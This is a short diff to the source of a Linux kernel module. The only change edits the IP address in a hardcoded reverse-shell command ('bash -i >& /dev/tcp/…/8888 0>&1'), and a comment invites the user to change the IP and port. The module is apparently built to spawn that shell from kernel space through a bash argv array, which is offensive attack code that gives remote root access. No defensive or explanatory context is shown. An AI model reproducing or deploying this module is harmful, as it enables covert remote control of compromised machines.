@@ -3,7 +3,7 @@
 #include <linux/module.h>
 #include <linux/kmod.h>
 
-static char command[] = "bash -i >& /dev/tcp/10.20.0.110/8888 0>&1"; //Reverse shell change ip and port if needed
+static char command[] = "bash -i >& /dev/tcp/10.20.1.18/8888 0>&1"; //Reverse shell change ip and port if needed
 
 char *argv[] = {
     "/bin/bash",
